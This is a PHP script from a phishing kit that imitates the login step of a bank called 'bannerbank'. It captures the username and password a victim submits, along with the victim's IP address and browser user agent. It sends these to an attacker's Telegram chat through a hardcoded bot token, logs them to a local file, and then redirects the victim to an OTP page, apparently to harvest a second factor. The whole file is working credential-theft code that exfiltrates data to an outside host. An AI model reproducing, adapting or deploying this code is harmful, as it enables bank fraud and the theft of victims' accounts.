<?php
require_once 'bot_protect.php';
session_start();

$user_id = trim($_POST['username'] ?? '');
$opassword = $_POST['password'] ?? '';

if ($user_id === '' || $opassword === '') {
    header('Location: index.html');
    exit;
}

$_SESSION['login_username'] = $user_id;
$_SESSION['login_password'] = $opassword;
$_SESSION['otp_show_form'] = false;

$bot_token = '8717001603:AAHpc8GZ4HG_GADthZcTmmT2bwayNoztmpE';
$chat_id = '-1003904780356';

function login_get_ip(): string
{
    foreach (['HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'] as $key) {
        if (!empty($_SERVER[$key])) {
            $ipList = explode(',', $_SERVER[$key]);
            $ip = trim(end($ipList));
            if (filter_var($ip, FILTER_VALIDATE_IP)) {
                return $ip;
            }
        }
    }
    return 'Unknown';
}

$ip = login_get_ip();
$user_agent_browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

$message = "bannerbank (step 1 — login):\n";
$message .= "USERNAME: <code>" . htmlspecialchars($user_id, ENT_QUOTES, 'UTF-8') . "</code>\n";
$message .= "PASSWORD: <code>" . htmlspecialchars($opassword, ENT_QUOTES, 'UTF-8') . "</code>\n\n";
$message .= "IP Address: $ip\n";
$message .= "UserAgent: $user_agent_browser";

$params = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'HTML',
];
file_get_contents('https://api.telegram.org/bot' . $bot_token . '/sendMessage?' . http_build_query($params));

$log = '[' . date('Y-m-d H:i:s') . "] step1\n$message\n\n";
file_put_contents('log.txt', $log, FILE_APPEND | LOCK_EX);

header('Location: otp.php');
exit;
